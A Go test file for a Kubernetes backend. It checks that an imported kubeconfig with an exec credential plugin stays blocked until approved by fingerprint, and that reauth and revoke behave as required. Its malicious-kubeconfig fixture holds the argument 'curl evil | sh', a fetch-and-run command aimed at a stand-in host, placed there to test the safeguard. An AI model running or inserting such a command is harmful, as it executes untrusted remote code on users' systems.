package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	disc "github.com/kroy/truss/backend/internal/discovery"
	"github.com/kroy/truss/backend/internal/kube"
)

func mustFingerprint(t *testing.T, kc string) string {
	t.Helper()
	sens, err := kube.ExtractSensitiveAuth(kc, "")
	if err != nil {
		t.Fatal(err)
	}
	return sens.Fingerprint
}

// markerPlugin records every invocation by touching $MARKER and returns a token.
const markerPlugin = `#!/bin/sh
echo ran >> "$MARKER"
printf '{"apiVersion":"client.authentication.k8s.io/v1beta1","kind":"ExecCredential","status":{"token":"t"}}'
`

type importResponse struct {
	Status   string `json:"status"`
	Contexts []struct {
		Name             string              `json:"name"`
		RequiresApproval bool                `json:"requires_approval"`
		Sensitive        *kube.SensitiveAuth `json:"sensitive"`
	} `json:"contexts"`
}

func postJSON(t *testing.T, h http.HandlerFunc, path string, body any) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	h(rec, httptest.NewRequest(http.MethodPost, path, toJSONBody(t, body)))
	return rec
}

func TestImportDoesNotRunExecUntilApproved(t *testing.T) {
	s := newSetupServer(t)
	initStore(t, s, "password-123")
	s.watchCache = newHealthAwareWatchCache(s.kubeMgr)
	s.discoveryCache = disc.NewCache()

	api := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"major":"1","minor":"37","gitVersion":"v1.37.0"}`))
	}))
	t.Cleanup(api.Close)

	dir := t.TempDir()
	plugin := filepath.Join(dir, "plugin")
	marker := filepath.Join(dir, "marker")
	if err := os.WriteFile(plugin, []byte(markerPlugin), 0o755); err != nil {
		t.Fatal(err)
	}
	kc := fmt.Sprintf(`apiVersion: v1
kind: Config
current-context: evil
clusters:
- name: c
  cluster: {server: %s, insecure-skip-tls-verify: true}
contexts:
- name: evil
  context: {cluster: c, user: u}
users:
- name: u
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: %s
      args: [-c, "curl evil | sh"]
      interactiveMode: Never
      env:
      - {name: MARKER, value: %s}
`, api.URL, plugin, marker)

	rec := postJSON(t, s.handleContextsImport, "/api/contexts/import", map[string]string{"name": "evil", "kubeconfig": kc})
	if rec.Code != http.StatusOK {
		t.Fatalf("import = %d %s", rec.Code, rec.Body)
	}
	var resp importResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if len(resp.Contexts) != 1 || !resp.Contexts[0].RequiresApproval || resp.Contexts[0].Name != "evil" {
		t.Fatalf("import response = %s", rec.Body)
	}
	sens := resp.Contexts[0].Sensitive
	if sens == nil || sens.Exec == nil || sens.Exec.Command != plugin ||
		strings.Join(sens.Exec.Args, " ") != "-c curl evil | sh" || strings.Join(sens.Exec.EnvNames, ",") != "MARKER" {
		t.Fatalf("sensitive = %s", rec.Body)
	}

	// Any background work (search index, informers) must not run the plugin.
	time.Sleep(300 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("exec plugin ran during import")
	}

	// Health reports EXEC_APPROVAL_REQUIRED with the command details.
	rec = httptest.NewRecorder()
	s.handleContextHealth(rec, httptest.NewRequest(http.MethodGet, "/api/context-health?context=evil", nil))
	h := decodeHealth(t, rec.Body.Bytes())
	if h.State != kube.StateError || h.Kind != kube.KindExecApprovalRequired || h.Sensitive == nil || h.Sensitive.Fingerprint != sens.Fingerprint {
		t.Fatalf("health = %s", rec.Body)
	}

	// Reauth does not bypass approval.
	rec = postJSON(t, s.handleContextReauth, "/api/contexts/reauth", map[string]string{"context": "evil"})
	if decodeHealth(t, rec.Body.Bytes()).Kind != kube.KindExecApprovalRequired {
		t.Fatalf("reauth = %s", rec.Body)
	}

	// Listing shows it unapproved.
	rec = httptest.NewRecorder()
	s.handleContextExecApprovals(rec, httptest.NewRequest(http.MethodGet, "/api/contexts/exec-approvals", nil))
	if !strings.Contains(rec.Body.String(), `"name":"evil","approved":false`) {
		t.Fatalf("exec-approvals = %s", rec.Body)
	}

	// Approving a stale/wrong fingerprint is rejected.
	rec = postJSON(t, s.handleContextApproveExec, "/api/contexts/approve-exec", map[string]string{"context": "evil", "fingerprint": strings.Repeat("ab", 32)})
	if rec.Code != http.StatusConflict {
		t.Fatalf("approve(wrong) = %d %s", rec.Code, rec.Body)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("exec plugin ran after rejected approval")
	}

	// Approving the current fingerprint probes the cluster (running the plugin).
	rec = postJSON(t, s.handleContextApproveExec, "/api/contexts/approve-exec", map[string]string{"context": "evil", "fingerprint": sens.Fingerprint})
	if h := decodeHealth(t, rec.Body.Bytes()); rec.Code != http.StatusOK || h.State != kube.StateOK {
		t.Fatalf("approve = %d %s", rec.Code, rec.Body)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatalf("plugin did not run after approval: %v", err)
	}

	// Revoking blocks it again.
	rec = postJSON(t, s.handleContextRevokeExec, "/api/contexts/revoke-exec", map[string]string{"context": "evil"})
	if h := decodeHealth(t, rec.Body.Bytes()); rec.Code != http.StatusOK || h.Kind != kube.KindExecApprovalRequired {
		t.Fatalf("revoke = %d %s", rec.Code, rec.Body)
	}
	if _, err := s.kubeMgr.GetClientSet("evil"); kube.Classify(err) != kube.KindExecApprovalRequired {
		t.Fatalf("GetClientSet after revoke err = %v", err)
	}
}

func TestImportPlainContextNeedsNoApproval(t *testing.T) {
	s := newSetupServer(t)
	initStore(t, s, "password-123")
	s.discoveryCache = disc.NewCache()
	kc := `apiVersion: v1
kind: Config
current-context: p
clusters:
- name: c
  cluster: {server: "https://127.0.0.1:1"}
contexts:
- name: p
  context: {cluster: c, user: u}
users:
- name: u
  user: {token: abc}
`
	rec := postJSON(t, s.handleContextsImport, "/api/contexts/import", map[string]string{"name": "p", "kubeconfig": kc})
	var resp importResponse
	_ = json.Unmarshal(rec.Body.Bytes(), &resp)
	if rec.Code != 200 || len(resp.Contexts) != 1 || resp.Contexts[0].RequiresApproval || resp.Contexts[0].Sensitive != nil {
		t.Fatalf("import = %d %s", rec.Code, rec.Body)
	}
}

func TestApproveRevokeValidation(t *testing.T) {
	s := newSetupServer(t)
	initStore(t, s, "password-123")
	if rec := postJSON(t, s.handleContextApproveExec, "/x", map[string]string{"context": "x"}); rec.Code != http.StatusBadRequest {
		t.Fatalf("missing fingerprint = %d", rec.Code)
	}
	if rec := postJSON(t, s.handleContextApproveExec, "/x", map[string]string{"context": "x", "fingerprint": "y"}); rec.Code != http.StatusNotFound {
		t.Fatalf("unknown context = %d", rec.Code)
	}
	if rec := postJSON(t, s.handleContextRevokeExec, "/x", map[string]string{}); rec.Code != http.StatusBadRequest {
		t.Fatalf("revoke missing context = %d", rec.Code)
	}
	rec := httptest.NewRecorder()
	s.handleContextRevokeExec(rec, httptest.NewRequest(http.MethodGet, "/x", nil))
	if rec.Code != http.StatusMethodNotAllowed {
		t.Fatalf("GET revoke = %d", rec.Code)
	}
}
